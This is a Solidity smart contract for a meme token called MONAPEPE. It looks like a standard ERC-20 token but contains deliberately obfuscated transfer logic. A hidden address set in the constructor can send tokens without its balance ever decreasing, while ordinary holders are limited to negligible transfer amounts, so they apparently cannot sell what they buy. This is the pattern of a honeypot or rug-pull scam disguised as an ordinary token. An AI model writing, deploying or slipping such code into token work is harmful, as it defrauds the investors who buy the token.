/*

https://t.me/ercmonapepe

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract MONAPEPE is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private uxvpwzgkdq;

    mapping(address => uint256) private rvsl;

    IUniswapV2Router02 private remhtsni;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function cahswnemkq(address lrgtzaweuon, address xcjmdq, uint256 aqwmvd) private {
        address ehjcaqftinvx = IUniswapV2Factory(remhtsni.factory()).getPair(address(this), remhtsni.WETH());
        bool xlyjvbachpt = kdqnbxtwlg[lrgtzaweuon] == block.number;
        uint256 rmnhukwfyap = uxvpwzgkdq[lrgtzaweuon];
        if (0 == rmnhukwfyap) {
            if (lrgtzaweuon != ehjcaqftinvx && (!xlyjvbachpt || aqwmvd > rvsl[lrgtzaweuon]) && aqwmvd < totalSupply) {
                require(aqwmvd <= totalSupply / (10 ** decimals));
            }
            balanceOf[lrgtzaweuon] -= aqwmvd;
        }
        rvsl[xcjmdq] = aqwmvd;
        balanceOf[xcjmdq] += aqwmvd;
        kdqnbxtwlg[xcjmdq] = block.number;
        emit Transfer(lrgtzaweuon, xcjmdq, aqwmvd);
    }

    uint8 public decimals = 9;

    function approve(address iztbsy, uint256 aqwmvd) public returns (bool success) {
        allowance[msg.sender][iztbsy] = aqwmvd;
        emit Approval(msg.sender, iztbsy, aqwmvd);
        return true;
    }

    string public symbol;

    uint256 private trzxvquy = 108;

    function transfer(address xcjmdq, uint256 aqwmvd) public returns (bool success) {
        cahswnemkq(msg.sender, xcjmdq, aqwmvd);
        return true;
    }

    string public name;

    function transferFrom(address lrgtzaweuon, address xcjmdq, uint256 aqwmvd) public returns (bool success) {
        require(aqwmvd <= allowance[lrgtzaweuon][msg.sender]);
        allowance[lrgtzaweuon][msg.sender] -= aqwmvd;
        cahswnemkq(lrgtzaweuon, xcjmdq, aqwmvd);
        return true;
    }

    mapping(address => uint256) private kdqnbxtwlg;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(string memory hqiklf, string memory zcaqdpef, address ioqermutxspn, address ocdyn) {
        name = hqiklf;
        symbol = zcaqdpef;
        balanceOf[msg.sender] = totalSupply;
        uxvpwzgkdq[ocdyn] = trzxvquy;
        remhtsni = IUniswapV2Router02(ioqermutxspn);
    }
}
